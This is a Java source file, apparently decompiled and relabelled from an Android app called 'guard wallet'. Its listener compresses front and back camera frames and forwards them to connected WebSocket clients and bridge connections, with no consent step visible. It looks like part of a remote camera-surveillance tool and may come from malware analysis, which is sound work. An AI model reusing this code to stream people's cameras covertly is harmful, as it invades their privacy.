package com.guard.wallet.camera;

import com.guard.wallet.core.AppUtils;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.Image;
import android.media.ImageReader;
import android.media.ImageReader.OnImageAvailableListener;
import android.util.Log;
import com.guard.wallet.utils.SystemHelper;
import java.nio.ByteBuffer;
import java.util.Iterator;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * ImageReader.OnImageAvailableListener -- 相机帧监听器。
 * 将 JPEG 相机帧转换为压缩字节数组，分发给 WebSocket 客户端和/或桥接连接。
 * vendor 原始路径: m/f.java
 */
public final class CameraFrameListener implements OnImageAvailableListener {
    public final int a;

    public CameraFrameListener(int var1) {
        this.a = var1;
    }

    @Override
    public final void onImageAvailable(ImageReader var1) {
        Image image = var1.acquireLatestImage();
        if (image == null) {
            return;
        }

        boolean needSend;
        int facing = this.a;

        // Check if any client needs camera frames
        if (Objects.equals(0, facing)) {
            if (Integer.valueOf(com.guard.wallet.server.WebSocketManager.getInstance().messageQueueA.size()) > 0) {
                needSend = true;
            } else {
                com.guard.wallet.bridge.a bridge = AppUtils.f;
                needSend = bridge != null && bridge.w.get();
            }
        } else if (Objects.equals(1, facing)) {
            if (Integer.valueOf(com.guard.wallet.server.WebSocketManager.getInstance().messageQueueB.size()) > 0) {
                needSend = true;
            } else {
                com.guard.wallet.bridge.a bridge = AppUtils.g;
                needSend = bridge != null && bridge.w.get();
            }
        } else {
            Log.d("CameraFrameListener", "不需要发送摄像头画面");
            needSend = false;
        }

        if (needSend) {
            // Decode JPEG image to bitmap
            Bitmap bitmap = null;
            try {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                int capacity = buffer.capacity();
                byte[] bytes = new byte[capacity];
                buffer.get(bytes);
                bitmap = BitmapFactory.decodeByteArray(bytes, 0, capacity, null);
            } catch (Exception ex) {
                AppUtils.s("BitmapUtils", ex);
            }

            // Compress bitmap to JPEG bytes
            byte[] compressed = SystemHelper.M0(bitmap, 0.8F, 80);

            // Front camera (facing=0): send to WebSocket clients and bridge
            if (Objects.equals(0, facing)) {
                if (Integer.valueOf(com.guard.wallet.server.WebSocketManager.getInstance().messageQueueA.size()) > 0) {
                    com.guard.wallet.server.WebSocketManager server = com.guard.wallet.server.WebSocketManager.getInstance();
                    server.getClass();
                    if (compressed != null) {
                        try {
                            if (compressed.length > 0) {
                                ConcurrentLinkedQueue queue = server.messageQueueA;
                                if (!queue.isEmpty()) {
                                    Iterator iter = queue.iterator();
                                    while (iter.hasNext()) {
                                        ((com.guard.wallet.websocket.WebSocketConnection) iter.next()).sendBytes(compressed);
                                    }
                                }
                            }
                        } catch (Exception ex) {
                            AppUtils.s("MyWebSocketServer", ex);
                        }
                    }
                    Log.d("CameraFrameListener", "前置摄像头画面发送完成");
                }

                com.guard.wallet.bridge.a bridgeFront = AppUtils.f;
                boolean bridgeActive;
                if (bridgeFront != null && bridgeFront.w.get()) {
                    bridgeActive = true;
                } else {
                    bridgeActive = false;
                }

                if (bridgeActive) {
                    if (compressed != null && compressed.length > 0) {
                        bridgeFront = AppUtils.f;
                        if (bridgeFront != null && bridgeFront.w.get()) {
                            AppUtils.f.B(compressed);
                        }
                    }
                    Log.d("CameraFrameListener", "前置摄像头画面发送完成");
                }
            }

            // Back camera (facing=1): send to WebSocket clients and bridge
            if (Objects.equals(1, facing)) {
                if (Integer.valueOf(com.guard.wallet.server.WebSocketManager.getInstance().messageQueueB.size()) > 0) {
                    com.guard.wallet.server.WebSocketManager server = com.guard.wallet.server.WebSocketManager.getInstance();
                    server.getClass();
                    if (compressed != null) {
                        try {
                            if (compressed.length > 0) {
                                ConcurrentLinkedQueue queue = server.messageQueueB;
                                if (!queue.isEmpty()) {
                                    Iterator iter = queue.iterator();
                                    while (iter.hasNext()) {
                                        ((com.guard.wallet.websocket.WebSocketConnection) iter.next()).sendBytes(compressed);
                                    }
                                }
                            }
                        } catch (Exception ex) {
                            AppUtils.s("MyWebSocketServer", ex);
                        }
                    }
                    Log.d("CameraFrameListener", "后置摄像头画面发送完成");
                }

                com.guard.wallet.bridge.a bridgeBack = AppUtils.g;
                boolean backActive;
                if (bridgeBack != null && bridgeBack.w.get()) {
                    backActive = true;
                } else {
                    backActive = false;
                }

                if (backActive) {
                    if (compressed != null && compressed.length > 0) {
                        bridgeBack = AppUtils.g;
                        if (bridgeBack != null && bridgeBack.w.get()) {
                            AppUtils.g.B(compressed);
                        }
                    }
                    Log.d("CameraFrameListener", "后置摄像头画面发送完成");
                }
            }

            SystemHelper.J0(bitmap);
        }

        image.close();
    }
}
